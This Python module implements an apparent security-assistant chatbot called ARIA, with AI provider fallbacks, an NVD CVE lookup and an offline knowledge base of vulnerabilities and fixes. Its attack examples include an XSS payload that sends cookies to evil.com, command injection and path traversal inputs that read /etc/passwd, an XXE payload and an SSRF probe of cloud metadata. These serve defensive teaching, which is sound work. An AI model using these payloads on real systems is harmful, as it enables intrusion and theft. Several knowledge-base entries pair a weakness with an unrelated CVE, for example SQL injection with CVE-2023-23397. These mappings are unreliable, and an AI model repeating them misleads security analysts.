# ai_agent.py
"""
ARIA — Autonomous Risk Intelligence Agent  v2
=============================================
Provider priority:  Ollama → Gemini 2.0 Flash → Offline rule-engine
Offline mode always works — zero external dependencies required.

External APIs:
  • Google Gemini 2.0 Flash  (GEMINI_API_KEY)
  • Ollama local LLM          (OLLAMA_URL + OLLAMA_MODEL)
  • NVD API v2                (optional NVD_API_KEY for higher rate limits)
"""

import json
import logging
import os
import re
import threading
from datetime import datetime
from typing import Optional

import requests

logger = logging.getLogger(__name__)

# ── Environment ───────────────────────────────────────────────────────────────
_GEMINI_KEY   = os.environ.get("GEMINI_API_KEY",  "").strip()
_NVD_KEY      = os.environ.get("NVD_API_KEY",     "").strip()
_OLLAMA_URL   = os.environ.get("OLLAMA_URL",      "").strip()
_OLLAMA_MODEL = os.environ.get("OLLAMA_MODEL",    "mistral").strip()
_NVD_BASE     = "https://services.nvd.nist.gov/rest/json/cves/2.0"

# ── Gemini init ───────────────────────────────────────────────────────────────
_genai_client = None
try:
    if _GEMINI_KEY:
        from google import genai as _genai_mod
        _genai_client = _genai_mod.Client(api_key=_GEMINI_KEY)
        logger.info("ARIA: Gemini 2.0 Flash client initialised")
except Exception as _e:
    logger.warning("ARIA: Gemini init failed (%s)", _e)

# ── ARIA system prompt ────────────────────────────────────────────────────────
_SYSTEM_PROMPT = """\
You are ARIA (Autonomous Risk Intelligence Agent), the AI core of CyBrain — a professional cybersecurity analysis platform.

## Identity & role
You are a senior cybersecurity analyst with deep expertise in vulnerability assessment (CVSS v3.1, CVE, CWE), threat intelligence (MITRE ATT&CK, OWASP Top 10 2025), penetration testing (PTES, OSSTMM), and compliance frameworks (GDPR, PCI-DSS 4.0, ISO 27001, NIS2, HIPAA).

## Behavior rules
1. Always respond in the same language the user writes in. If the message is in Arabic, respond fully in Arabic. If English, respond in English.
2. Be direct, precise, and technical. No filler phrases.
3. When analyzing findings, always structure your response as: Severity assessment → Root cause → Real-world attack scenario → Remediation steps (ordered by priority) → CVE/CWE/OWASP reference.
4. When asked about a CVE, always include: CVSS score, affected versions, exploit status, and patch.
5. Never guess or fabricate CVE numbers, CVSS scores, or technical details. If uncertain, say so.
6. For compliance questions, map findings to specific control requirements with control IDs.
7. When multiple vulnerabilities are present, identify attack chains — combinations that create higher impact than individual findings alone.
8. For code review requests, always provide a before/after code block with the fix.

## Output format
Use markdown. For structured analysis use headers and bullet points. For code fixes use fenced code blocks with language specified. Keep responses concise unless the user asks for a detailed report.

## Constraints
You do not execute code or access external systems. You analyze data provided by CyBrain scanning engines. Never fabricate data. If a request is outside cybersecurity scope, politely redirect.\
"""

# ── Severity weights ──────────────────────────────────────────────────────────
_SEV_WEIGHT = {"critical": 10, "high": 7, "medium": 4, "low": 1, "info": 0}

# ── Offline knowledge base ────────────────────────────────────────────────────
_KB: dict[str, dict] = {
    "sql injection": {
        "cve": "CVE-2023-23397", "cwe": "CWE-89", "cvss": 9.8,
        "owasp": "A05:2025 Injection",
        "mitre": "T1190 Exploit Public-Facing Application",
        "attack": (
            "Attacker inputs `' OR 1=1 --` into a login field. "
            "The unsanitized query becomes `SELECT * FROM users WHERE user='' OR 1=1 -- AND pass=''`, "
            "returning all users and bypassing authentication."
        ),
        "impact": "Authentication bypass, data exfiltration, database destruction.",
        "fix": (
            "**Python:** `cursor.execute('SELECT * FROM t WHERE id=?', (user_id,))`\n"
            "**PHP:** `$stmt = $pdo->prepare('SELECT * FROM t WHERE id=?'); $stmt->execute([$id]);`\n"
            "**Java:** `PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM t WHERE id=?\"); ps.setInt(1, id);`"
        ),
        "tools": "sqlmap, Burp Suite Active Scanner",
    },
    "xss": {
        "cve": "CVE-2023-1829", "cwe": "CWE-79", "cvss": 7.4,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059.007 JavaScript",
        "attack": (
            "Attacker injects `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` "
            "into a comment field. Every visitor's session cookie is sent to the attacker."
        ),
        "impact": "Session hijacking, credential theft, defacement, malware distribution.",
        "fix": (
            "**Python:** `from markupsafe import escape; safe = escape(user_input)`\n"
            "**JS:** use `textContent` not `innerHTML`\n"
            "**PHP:** `htmlspecialchars($input, ENT_QUOTES, 'UTF-8')`\n"
            "**React:** avoid `dangerouslySetInnerHTML`; use `DOMPurify.sanitize()` if HTML is needed\n"
            "**CSP:** `Content-Security-Policy: default-src 'self'`"
        ),
        "tools": "OWASP ZAP, Burp Suite, XSStrike",
    },
    "command injection": {
        "cve": "CVE-2023-44487", "cwe": "CWE-78", "cvss": 10.0,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059 Command and Scripting Interpreter",
        "attack": "Input `; cat /etc/passwd` is passed to `os.system('ping ' + user_input)` — OS command executes.",
        "impact": "Full system compromise, data exfiltration, ransomware deployment.",
        "fix": (
            "**Never** use `os.system()`, `eval()`, or `shell=True` with user input.\n"
            "**Python:** `subprocess.run(['ping', '-c', '1', host], shell=False)`\n"
            "Validate input against strict allowlist before any OS call."
        ),
        "tools": "Commix, Burp Suite",
    },
    "path traversal": {
        "cve": "CVE-2021-41773", "cwe": "CWE-22", "cvss": 9.1,
        "owasp": "A05:2025 Injection",
        "mitre": "T1083 File and Directory Discovery",
        "attack": "Request to `?file=../../../../etc/passwd` reads sensitive system files.",
        "impact": "Source code, configuration files, /etc/passwd, private keys exposed.",
        "fix": (
            "```python\nimport os\nsafe = os.path.basename(user_input)\n"
            "real = os.path.realpath(os.path.join(BASE, safe))\n"
            "assert real.startswith(BASE), 'Path traversal detected'\n```"
        ),
        "tools": "Burp Suite, dirb",
    },
    "hardcoded credentials": {
        "cve": "CWE-798", "cwe": "CWE-798", "cvss": 9.1,
        "owasp": "A07:2025 Authentication Failures",
        "mitre": "T1552.001 Credentials In Files",
        "attack": "Developer commits `password = 'SuperSecret123'` to GitHub. Attacker finds it via git log or GitHub search.",
        "impact": "Full database access, API key abuse, account takeover.",
        "fix": (
            "```python\nimport os\nDB_PASS = os.environ.get('DB_PASSWORD')  # from .env\n```\n"
            "Use a secrets manager (Vault, AWS Secrets Manager) in production.\n"
            "Add `.env` to `.gitignore`. Use `git-secrets` or `truffleHog` to scan history."
        ),
        "tools": "truffleHog, git-secrets, Semgrep p/secrets",
    },
    "weak cryptography": {
        "cve": "CVE-2023-2650", "cwe": "CWE-327", "cvss": 6.5,
        "owasp": "A04:2025 Cryptographic Failures",
        "mitre": "T1110 Brute Force",
        "attack": "MD5 hash of password cracked with rainbow table in < 1 second using hashcat.",
        "impact": "Mass password cracking after database breach.",
        "fix": (
            "**Password hashing:** `import bcrypt; bcrypt.hashpw(pwd.encode(), bcrypt.gensalt(12))`\n"
            "**Encryption:** Use AES-256-GCM via `cryptography` library\n"
            "**Hashing (non-password):** SHA-256 minimum, SHA-3 preferred\n"
            "**Never use:** MD5, SHA-1, DES, RC4 for security purposes"
        ),
        "tools": "hashcat, john the ripper",
    },
    "missing security headers": {
        "cve": "CWE-693", "cwe": "CWE-693", "cvss": 5.3,
        "owasp": "A02:2025 Security Misconfiguration",
        "mitre": "T1185 Browser Session Hijacking",
        "attack": "No X-Frame-Options → clickjacking embeds site in iframe. No HSTS → MITM strips HTTPS.",
        "impact": "Clickjacking, XSS, MITM attacks, MIME sniffing.",
        "fix": (
            "```apache\nHeader always set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\n"
            "Header always set Content-Security-Policy \"default-src 'self'\"\n"
            "Header always set X-Frame-Options \"DENY\"\n"
            "Header always set X-Content-Type-Options \"nosniff\"\n"
            "Header always set Referrer-Policy \"strict-origin-when-cross-origin\"\n```"
        ),
        "tools": "Mozilla Observatory, securityheaders.com",
    },
    "open redirect": {
        "cve": "CVE-2021-40531", "cwe": "CWE-601", "cvss": 6.1,
        "owasp": "A01:2025 Broken Access Control",
        "mitre": "T1566 Phishing",
        "attack": "Link `https://trusted.com/redirect?url=https://evil.com` redirects user to phishing page.",
        "impact": "Credential phishing, session token theft.",
        "fix": (
            "Only allow relative URLs for redirects:\n"
            "```python\nfrom urllib.parse import urlparse\n"
            "if not urlparse(url).netloc:  # relative URL only\n    return redirect(url)\n```"
        ),
        "tools": "Burp Suite",
    },
    "idor": {
        "cve": "CWE-639", "cwe": "CWE-639", "cvss": 8.1,
        "owasp": "A01:2025 Broken Access Control",
        "mitre": "T1087 Account Discovery",
        "attack": "Changing `/api/orders/1234` to `/api/orders/1235` returns another user's order.",
        "impact": "Mass data exfiltration, PII exposure, financial data leak.",
        "fix": (
            "Always verify ownership server-side:\n"
            "```python\norder = Order.get(id=order_id)\nif order.user_id != current_user.id:\n    abort(403)\n```\n"
            "Use indirect references (UUIDs) instead of sequential IDs."
        ),
        "tools": "Burp Suite Intruder, AuthMatrix",
    },
    "ssrf": {
        "cve": "CVE-2021-26855", "cwe": "CWE-918", "cvss": 9.1,
        "owasp": "A10:2025 SSRF",
        "mitre": "T1090 Proxy",
        "attack": "Input `http://169.254.169.254/latest/meta-data/` in a URL field fetches AWS metadata with IAM credentials.",
        "impact": "Cloud metadata access, internal network scanning, RCE via SSRF chains.",
        "fix": (
            "```python\nfrom ipaddress import ip_address\nimport socket\n"
            "parsed = urlparse(user_url)\nip = socket.gethostbyname(parsed.hostname)\n"
            "if ip_address(ip).is_private:\n    raise ValueError('SSRF blocked')\n```\n"
            "Use a strict allowlist of permitted domains."
        ),
        "tools": "Burp Suite, SSRFire",
    },
    "insecure deserialization": {
        "cve": "CVE-2019-0708", "cwe": "CWE-502", "cvss": 9.8,
        "owasp": "A08:2025 Integrity Failures",
        "mitre": "T1059 Command Execution",
        "attack": "Attacker sends crafted pickle payload → arbitrary Python code executes on server.",
        "impact": "Remote code execution, full server compromise.",
        "fix": (
            "**Never** deserialize untrusted data with `pickle`, `yaml.load()`, `marshal`.\n"
            "```python\nimport yaml\nyaml.safe_load(data)  # NOT yaml.load()\n```\n"
            "Use JSON for data exchange. Validate + sign serialized objects."
        ),
        "tools": "ysoserial, PHPGGC",
    },
    "xml injection": {
        "cve": "CVE-2019-0229", "cwe": "CWE-611", "cvss": 9.1,
        "owasp": "A05:2025 Injection",
        "mitre": "T1059 Command Execution",
        "attack": "XXE payload `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>` reads local files.",
        "impact": "Local file disclosure, SSRF, DoS via billion laughs.",
        "fix": (
            "```python\nfrom lxml import etree\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\n```\n"
            "Disable external entity processing in all XML parsers."
        ),
        "tools": "XXEinjector, Burp Suite",
    },
    "broken authentication": {
        "cve": "CWE-287", "cwe": "CWE-287", "cvss": 9.8,
        "owasp": "A07:2025 Authentication Failures",
        "mitre": "T1110 Brute Force",
        "attack": "No rate limiting on login → attacker runs credential stuffing with 100M leaked passwords.",
        "impact": "Mass account takeover.",
        "fix": (
            "• Rate limiting: `@limiter.limit('10/minute')`\n"
            "• Account lockout after 5 failed attempts\n"
            "• Require MFA for sensitive actions\n"
            "• Use bcrypt/argon2 (never MD5/SHA1)\n"
            "• CAPTCHA after 3 failures"
        ),
        "tools": "Hydra, Burp Suite Intruder",
    },
    "ssl": {
        "cve": "CVE-2022-3786", "cwe": "CWE-326", "cvss": 7.5,
        "owasp": "A04:2025 Cryptographic Failures",
        "mitre": "T1040 Network Sniffing",
        "attack": "TLS 1.0/1.1 susceptible to BEAST, POODLE attacks. Weak ciphers crackable.",
        "impact": "Traffic decryption, credential interception.",
        "fix": (
            "```apache\nSSLProtocol -all +TLSv1.2 +TLSv1.3\n"
            "SSLCipherSuite HIGH:!MD5:!RC4:!3DES:!EXPORT\n"
            "SSLHonorCipherOrder on\n```\n"
            "Reference: https://ssl-config.mozilla.org/"
        ),
        "tools": "SSL Labs, testssl.sh, nmap ssl-*",
    },
}

# ── MITRE ATT&CK mapping ──────────────────────────────────────────────────────
_MITRE_MAP: dict[str, dict] = {
    "rce":                    {"tactic": "Execution",          "technique_id": "T1059",     "technique": "Command and Scripting Interpreter"},
    "remote code":            {"tactic": "Execution",          "technique_id": "T1059",     "technique": "Command and Scripting Interpreter"},
    "command injection":      {"tactic": "Execution",          "technique_id": "T1059",     "technique": "Command and Scripting Interpreter"},
    "command_injection":      {"tactic": "Execution",          "technique_id": "T1059",     "technique": "Command and Scripting Interpreter"},
    "sql injection":          {"tactic": "Initial Access",     "technique_id": "T1190",     "technique": "Exploit Public-Facing Application"},
    "sqli":                   {"tactic": "Initial Access",     "technique_id": "T1190",     "technique": "Exploit Public-Facing Application"},
    "xss":                    {"tactic": "Execution",          "technique_id": "T1059.007", "technique": "JavaScript"},
    "csrf":                   {"tactic": "Initial Access",     "technique_id": "T1185",     "technique": "Browser Session Hijacking"},
    "path traversal":         {"tactic": "Discovery",          "technique_id": "T1083",     "technique": "File and Directory Discovery"},
    "path_traversal":         {"tactic": "Discovery",          "technique_id": "T1083",     "technique": "File and Directory Discovery"},
    "lfi":                    {"tactic": "Discovery",          "technique_id": "T1083",     "technique": "File and Directory Discovery"},
    "ssrf":                   {"tactic": "Initial Access",     "technique_id": "T1090",     "technique": "Proxy"},
    "idor":                   {"tactic": "Collection",         "technique_id": "T1087",     "technique": "Account Discovery"},
    "xxe":                    {"tactic": "Exfiltration",       "technique_id": "T1005",     "technique": "Data from Local System"},
    "deserialization":        {"tactic": "Execution",          "technique_id": "T1059",     "technique": "Command and Scripting Interpreter"},
    "hardcoded":              {"tactic": "Credential Access",  "technique_id": "T1552.001", "technique": "Credentials In Files"},
    "hardcoded_secret":       {"tactic": "Credential Access",  "technique_id": "T1552.001", "technique": "Credentials In Files"},
    "credential":             {"tactic": "Credential Access",  "technique_id": "T1552.001", "technique": "Credentials In Files"},
    "authentication bypass":  {"tactic": "Defense Evasion",   "technique_id": "T1078",     "technique": "Valid Accounts"},
    "open_port":              {"tactic": "Discovery",          "technique_id": "T1046",     "technique": "Network Service Scanning"},
    "missing_header":         {"tactic": "Defense Evasion",   "technique_id": "T1185",     "technique": "Browser Session Hijacking"},
    "missing header":         {"tactic": "Defense Evasion",   "technique_id": "T1185",     "technique": "Browser Session Hijacking"},
    "ssl":                    {"tactic": "Collection",         "technique_id": "T1040",     "technique": "Network Sniffing"},
    "information_disclosure": {"tactic": "Discovery",          "technique_id": "T1592",     "technique": "Gather Victim Host Information"},
    "information disclosure": {"tactic": "Discovery",          "technique_id": "T1592",     "technique": "Gather Victim Host Information"},
}
_MITRE_BASE = "https://attack.mitre.org/techniques/"

# ── OWASP Top 10 2025 ─────────────────────────────────────────────────────────
_OWASP_TOP10 = """## OWASP Top 10 — 2025

| # | Category | Risk | Key Vulns |
|---|----------|------|-----------|
| A01 | Broken Access Control | CRITICAL | IDOR, path traversal, privilege escalation |
| A02 | Security Misconfiguration | HIGH | Missing headers, default creds, verbose errors |
| A03 | Software Supply Chain | HIGH | Malicious packages, outdated deps with CVEs |
| A04 | Cryptographic Failures | HIGH | Weak ciphers, MD5/SHA1 passwords, no HTTPS |
| A05 | Injection | CRITICAL | SQLi, XSS, Command Injection, XXE, SSTI |
| A06 | Insecure Design | HIGH | Missing rate limits, no defense in depth |
| A07 | Authentication Failures | CRITICAL | Brute-force, session fixation, weak passwords |
| A08 | Integrity Failures | HIGH | Insecure deserialization, unsigned updates |
| A09 | Logging Failures | MEDIUM | No audit trail, sensitive data in logs |
| A10 | SSRF | HIGH | Cloud metadata, internal network scanning |

Source: https://owasp.org/Top10/"""

# ── CVSS guide ────────────────────────────────────────────────────────────────
_CVSS_GUIDE = """## CVSS v3.1 Severity Levels

| Score | Severity | Action Required |
|-------|----------|-----------------|
| 9.0–10.0 | **CRITICAL** | Patch immediately — exploitable remotely, no auth |
| 7.0–8.9 | **HIGH** | Fix within 24–48 hours |
| 4.0–6.9 | **MEDIUM** | Fix within 2 weeks |
| 0.1–3.9 | **LOW** | Fix when possible, monitor |
| 0.0 | **INFO** | Informational only |

**Key CVSS metrics:**
- **AV:N** (Attack Vector Network) — remotely exploitable
- **AC:L** (Attack Complexity Low) — easy to exploit
- **PR:N** (Privileges Required None) — no login needed
- **UI:N** (User Interaction None) — no victim interaction
- **C/I/A: H** — High impact on Confidentiality/Integrity/Availability"""


def _is_arabic(text: str) -> bool:
    """Return True if the text contains Arabic Unicode characters."""
    return bool(re.search(r"[؀-ۿ]", text))


class ARIA:
    """Autonomous Risk Intelligence Agent — Ollama → Gemini → Offline fallback."""

    _HISTORY_LIMIT = 20

    def __init__(self):
        self.ai_active = False
        self.provider  = "offline"
        # Per-user conversation history: { user_id -> [{"q": ..., "a": ...}, ...] }
        self._chat_histories: dict[str, list[dict]] = {}

        if _OLLAMA_URL:
            self.provider  = "ollama"
            self.ai_active = True
            logger.info("ARIA online — Ollama at %s (model: %s)", _OLLAMA_URL, _OLLAMA_MODEL)
        elif _genai_client:
            self.provider  = "gemini"
            self.ai_active = True
            logger.info("ARIA online — Gemini 2.0 Flash")
        else:
            logger.info("ARIA offline — set GEMINI_API_KEY or OLLAMA_URL to enable AI")

    # ── History helpers ───────────────────────────────────────────────────────

    def _get_history(self, user_id: str) -> list[dict]:
        if user_id not in self._chat_histories:
            self._chat_histories[user_id] = []
        return self._chat_histories[user_id]

    def clear_history(self, user_id: str) -> None:
        """Erase conversation history for a specific user."""
        self._chat_histories.pop(str(user_id), None)

    def clear_all_histories(self) -> int:
        """Erase all per-user conversation histories. Returns number of sessions cleared."""
        count = len(self._chat_histories)
        self._chat_histories.clear()
        return count

    # ── Provider calls ────────────────────────────────────────────────────────

    def _gemini(self, prompt: str, system: str = "") -> Optional[str]:
        if not _genai_client:
            return None
        try:
            full = f"{system}\n\n{prompt}" if system else prompt
            resp = _genai_client.models.generate_content(
                model="gemini-2.0-flash",
                contents=full,
                config={"timeout": 30},
            )
            return resp.text
        except Exception as exc:
            logger.warning("ARIA Gemini error: %s", exc)
            return None

    def _ollama(self, prompt: str, system: str = "") -> Optional[str]:
        if not _OLLAMA_URL:
            return None
        try:
            messages = []
            if system:
                messages.append({"role": "system", "content": system})
            messages.append({"role": "user", "content": prompt})
            r = requests.post(
                _OLLAMA_URL.rstrip("/") + "/api/chat",
                json={"model": _OLLAMA_MODEL, "messages": messages, "stream": False},
                timeout=60,
            )
            r.raise_for_status()
            return r.json().get("message", {}).get("content", "")
        except Exception as exc:
            logger.warning("ARIA Ollama error: %s", exc)
            return None

    def _ai_call(self, prompt: str, system: str = "") -> Optional[str]:
        """Call the highest-priority available AI provider."""
        if self.provider == "ollama":
            result = self._ollama(prompt, system)
            if result:
                return result
            # Fall through to Gemini if Ollama fails
            if _genai_client:
                return self._gemini(prompt, system)
        elif self.provider == "gemini":
            return self._gemini(prompt, system)
        return None

    # ── NVD CVE lookup ────────────────────────────────────────────────────────

    def lookup_cve(self, cve_id: str) -> dict:
        headers = {"apiKey": _NVD_KEY} if _NVD_KEY else {}
        try:
            r = requests.get(_NVD_BASE, params={"cveId": cve_id}, headers=headers, timeout=8)
            if r.status_code != 200:
                return {}
            vuln = r.json().get("vulnerabilities", [{}])[0].get("cve", {})
            desc = next((d["value"] for d in vuln.get("descriptions", []) if d.get("lang") == "en"), "")
            m    = vuln.get("metrics", {})
            cd   = (
                (m.get("cvssMetricV31") or [{}])[0].get("cvssData", {}) or
                (m.get("cvssMetricV30") or [{}])[0].get("cvssData", {}) or
                (m.get("cvssMetricV2")  or [{}])[0].get("cvssData", {})
            )
            return {
                "id":          cve_id,
                "description": desc,
                "cvss_score":  cd.get("baseScore"),
                "severity":    cd.get("baseSeverity"),
                "vector":      cd.get("vectorString"),
                "published":   vuln.get("published", "")[:10],
            }
        except Exception as exc:
            logger.debug("NVD lookup error for %s: %s", cve_id, exc)
            return {}

    # ── Chat ──────────────────────────────────────────────────────────────────

    def chat(self, message: str, context: Optional[dict] = None,
             user_id: str = "anonymous") -> str:
        ctx          = context or {}
        user_history = self._get_history(str(user_id))
        arabic       = _is_arabic(message)

        if self.ai_active:
            # Extend system prompt with language instruction
            system = _SYSTEM_PROMPT
            if arabic:
                system += "\n\nRespond entirely in Arabic. Use correct Arabic cybersecurity terminology."

            # Build history context (last 20 exchanges)
            history = "".join(
                f"User: {t['q']}\nARIA: {t['a']}\n\n"
                for t in user_history[-self._HISTORY_LIMIT:]
            )
            ctx_note = ""
            if ctx:
                ctx_note = (
                    f"\n\nActive scan context — target: {ctx.get('target','N/A')} | "
                    f"risk: {ctx.get('risk','N/A')} | findings: {ctx.get('total',0)}"
                )
            result = self._ai_call(f"{history}User: {message}{ctx_note}", system=system)
            if result:
                user_history.append({"q": message, "a": result})
                # Trim history to limit
                if len(user_history) > self._HISTORY_LIMIT:
                    self._chat_histories[str(user_id)] = user_history[-self._HISTORY_LIMIT:]
                return result

        # Offline fallback
        reply = self._offline(message.lower(), ctx, arabic=arabic)
        user_history.append({"q": message, "a": reply})
        if len(user_history) > self._HISTORY_LIMIT:
            self._chat_histories[str(user_id)] = user_history[-self._HISTORY_LIMIT:]
        return reply

    def _offline(self, msg: str, ctx: dict, arabic: bool = False) -> str:
        # CVE lookup
        cve_match = re.search(r"cve-(\d{4}-\d+)", msg, re.IGNORECASE)
        if cve_match:
            cve_id = f"CVE-{cve_match.group(1).upper()}"
            data   = self.lookup_cve(cve_id)
            if data:
                score = data.get('cvss_score', 'N/A')
                sev   = data.get('severity', 'N/A')
                return (
                    f"## {cve_id}\n\n"
                    f"**CVSS:** {score} {sev}\n"
                    f"**Published:** {data.get('published','N/A')}\n"
                    f"**Vector:** `{data.get('vector','N/A')}`\n\n"
                    f"**Description:** {data.get('description','N/A')}\n\n"
                    f"**Reference:** https://nvd.nist.gov/vuln/detail/{cve_id}"
                )
            return f"No NVD data found for {cve_id}. Check https://nvd.nist.gov/vuln/detail/{cve_id}"

        # Scan context explanation
        if ctx and any(k in msg for k in ["explain", "finding", "result", "scan", "vuln", "found", "what",
                                           "اشرح", "نتائج", "نتيجة", "فحص", "ثغرة"]):
            return self._explain_context(ctx)

        # Knowledge base
        for key, kb in _KB.items():
            if key in msg or key.replace(" ", "") in msg.replace(" ", ""):
                return self._kb_response(key, kb)

        if "owasp" in msg:
            return _OWASP_TOP10
        if any(k in msg for k in ["cvss", "severity", "score", "critical", "rating"]):
            return _CVSS_GUIDE
        if any(k in msg for k in ["header", "hsts", "csp", "x-frame", "cors", "security header"]):
            return _KB["missing security headers"]["fix"] + "\n\n**Test:** https://securityheaders.com"
        if any(k in msg for k in ["ssl", "tls", "https", "certificate", "cipher"]):
            return _KB["ssl"]["fix"]
        if any(k in msg for k in ["apache", "httpd", "nginx", "server config"]):
            return (
                "## Server Hardening\n\n"
                "```apache\n# Apache\nServerTokens Prod\nServerSignature Off\n"
                "Options -Indexes -ExecCGI\nTraceEnable Off\n"
                "SSLProtocol -all +TLSv1.2 +TLSv1.3\nLimitRequestBody 10485760\n"
                "Header always set X-Frame-Options DENY\n"
                "Header always set X-Content-Type-Options nosniff\n```\n\n"
                "```nginx\n# Nginx\nserver_tokens off;\n"
                "add_header X-Frame-Options DENY;\nadd_header X-Content-Type-Options nosniff;\n"
                "ssl_protocols TLSv1.2 TLSv1.3;\nssl_prefer_server_ciphers on;\n```"
            )
        if any(k in msg for k in ["auth", "login", "password", "session", "mfa", "totp", "2fa"]):
            return _KB["broken authentication"]["fix"]
        if any(k in msg for k in ["tool", "zap", "nikto", "nmap", "burp", "scanner"]):
            return (
                "## CyBrain Integrated Security Tools\n\n"
                "| Tool | Type | Purpose |\n|------|------|--------|\n"
                "| **OWASP ZAP** | DAST | Active web scanning |\n"
                "| **Nikto** | DAST | Web server misconfigs |\n"
                "| **Nmap** | Network | Port scan + NSE vulns |\n"
                "| **Bandit** | SAST | Python code analysis |\n"
                "| **Semgrep** | SAST | Multi-language analysis |\n"
                "| **Gitleaks** | Secrets | 150+ secret types |\n"
                "| **pip-audit** | Deps | Python CVE scan |\n"
                "| **npm audit** | Deps | Node.js CVE scan |\n\n"
                "**Free APIs:** SSL Labs · Mozilla Observatory · Shodan InternetDB · OSV.dev · NVD"
            )
        if any(k in msg for k in ["port", "network", "firewall", "smb", "rdp", "ssh"]):
            return (
                "## Network Security — Critical Ports\n\n"
                "| Port | Service | Risk | Action |\n|------|---------|------|--------|\n"
                "| 22 | SSH | HIGH | Key auth only, disable password auth |\n"
                "| 23 | Telnet | CRITICAL | Disable — use SSH |\n"
                "| 3389 | RDP | HIGH | VPN-only, enable NLA |\n"
                "| 3306 | MySQL | HIGH | Bind to 127.0.0.1 |\n"
                "| 6379 | Redis | CRITICAL | requirepass + bind 127.0.0.1 |\n"
                "| 27017 | MongoDB | CRITICAL | Enable --auth |\n"
                "| 445 | SMB | CRITICAL | Patch EternalBlue (MS17-010) |\n"
                "| 9200 | Elasticsearch | CRITICAL | Enable X-Pack security |"
            )
        if any(k in msg for k in ["report", "explain", "summary", "remediat"]):
            return self._explain_context(ctx) if ctx else (
                "Share scan results first (run a scan), then ask me to explain the findings."
            )

        return (
            "## ARIA Security Assistant\n\n"
            "I can help with:\n\n"
            "**Vulnerabilities (full attack + fix):**\n"
            "- SQL Injection, XSS, Command Injection, Path Traversal\n"
            "- SSRF, IDOR, XXE, Insecure Deserialization\n"
            "- Broken Authentication, Hardcoded Credentials\n"
            "- Weak Cryptography, Missing Security Headers\n\n"
            "**Standards & Reference:**\n"
            "- `owasp` — OWASP Top 10 2025\n"
            "- `cvss` — Severity scoring guide\n"
            "- `CVE-YYYY-NNNNN` — Real-time NVD CVE lookup\n\n"
            "**Configuration:** `apache hardening`, `ssl tls`, `security headers`\n\n"
            "**Tools:** `tools list` — all integrated security tools\n\n"
            "Ask me anything about security!"
        )

    def _kb_response(self, key: str, kb: dict) -> str:
        title = key.replace("_", " ").title()
        return (
            f"## {title}\n\n"
            f"**CVE:** {kb.get('cve','N/A')} | "
            f"**CWE:** {kb.get('cwe','N/A')} | "
            f"**CVSS:** {kb.get('cvss','N/A')} | "
            f"**OWASP:** {kb.get('owasp','N/A')}\n\n"
            f"**MITRE ATT&CK:** {kb.get('mitre','N/A')}\n\n"
            f"### Attack Scenario\n{kb.get('attack','N/A')}\n\n"
            f"### Impact\n{kb.get('impact','N/A')}\n\n"
            f"### Fix\n{kb.get('fix','N/A')}\n\n"
            f"**Detection Tools:** {kb.get('tools','N/A')}"
        )

    def _explain_context(self, ctx: dict) -> str:
        total  = ctx.get("total", 0)
        risk   = str(ctx.get("risk", "unknown")).lower()
        target = ctx.get("target", "target")
        if total == 0:
            return (
                f"## Scan Complete — {target}\n\n"
                "**No vulnerabilities found.** This could mean:\n"
                "1. The target is well-secured ✓\n"
                "2. The scan was passive — run DAST for active testing\n"
                "3. WAF or CDN may be blocking probes\n\n"
                "**Recommendation:** Run a DAST scan with OWASP ZAP for deeper analysis."
            )
        urgency = {
            "critical": "⚠️ **IMMEDIATE ACTION REQUIRED** — Critical vulnerabilities are actively exploitable.",
            "high":     "🔴 **Fix within 24–48 hours.** High-severity issues present serious risk.",
            "medium":   "🟡 Fix within 2 weeks. Address in the next release cycle.",
            "low":      "🟢 Fix when convenient. Minor improvements recommended.",
        }.get(risk, "Review all findings below.")
        return (
            f"## Security Assessment — {target}\n\n"
            f"**Findings:** {total} | **Highest Risk:** {risk.upper()}\n\n"
            f"{urgency}\n\n"
            "**Recommended Actions:**\n"
            "1. Address CRITICAL and HIGH findings immediately\n"
            "2. Review each finding's remediation steps\n"
            "3. Re-scan after applying fixes\n"
            "4. Export the full report for documentation and compliance\n\n"
            "*Ask me about any specific vulnerability for a detailed attack scenario and fix.*"
        )

    # ── Deterministic analysis helpers ───────────────────────────────────────

    def _build_mitre_mappings(self, findings: list) -> list[dict]:
        seen, rows = set(), []
        order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        for f in sorted(findings, key=lambda f: order.get((f.get("severity") or "info").lower(), 5)):
            sev        = (f.get("severity") or "info").lower()
            label      = (f.get("title") or f.get("check") or "")[:60]
            check_text = (
                (f.get("check", "") or "") + " " +
                (f.get("title",  "") or "") + " " +
                (f.get("description", "") or "")
            ).lower()
            for kw, mtr in _MITRE_MAP.items():
                if kw in check_text:
                    tid = mtr["technique_id"]
                    key = (tid, label[:30])
                    if key not in seen:
                        seen.add(key)
                        rows.append({
                            "finding":      label,
                            "severity":     sev,
                            "tactic":       mtr["tactic"],
                            "technique_id": tid,
                            "technique":    mtr["technique"],
                            "url":          f"{_MITRE_BASE}{tid.replace('.','/')}/",
                        })
                    break
        return rows

    def _build_compliance(self, counts: dict) -> dict:
        crit = counts.get("critical", 0) > 0
        high = counts.get("high", 0) > 0
        med  = counts.get("medium", 0) > 0
        return {
            "gdpr": {
                "status": "❌ VIOLATION RISK" if crit else ("⚠ REVIEW" if high else "✓ COMPLIANT"),
                "color":  "critical" if crit else ("high" if high else "low"),
                "note":   "Art.32: Critical vulns require breach notification within 72h." if crit
                          else ("Art.25: Privacy by design principles may be at risk." if high
                                else "No critical data protection violations detected."),
            },
            "pci_dss": {
                "status": "❌ FAIL" if (crit or high) else ("⚠ REVIEW" if med else "✓ PASS"),
                "color":  "critical" if crit else ("high" if (high or med) else "low"),
                "note":   "Req 6.3.3: All critical/high vulns must be remediated immediately." if (crit or high)
                          else ("Req 6.3.2: Remediate medium findings in next release." if med
                                else "PCI-DSS requirements appear satisfied."),
            },
            "iso_27001": {
                "status": "❌ NON-CONFORMITY" if high else ("⚠ MINOR GAPS" if med else "✓ CONFORMANT"),
                "color":  "critical" if crit else ("high" if (high or med) else "low"),
                "note":   "A.12.6.1: Technical vulnerabilities must be addressed per risk assessment." if high
                          else ("A.14.2: Secure development policies require addressing medium findings." if med
                                else "Technical control requirements appear to be met."),
            },
        }

    def _build_nvd_enriched(self, findings: list) -> dict:
        cve_ids: set[str] = set()
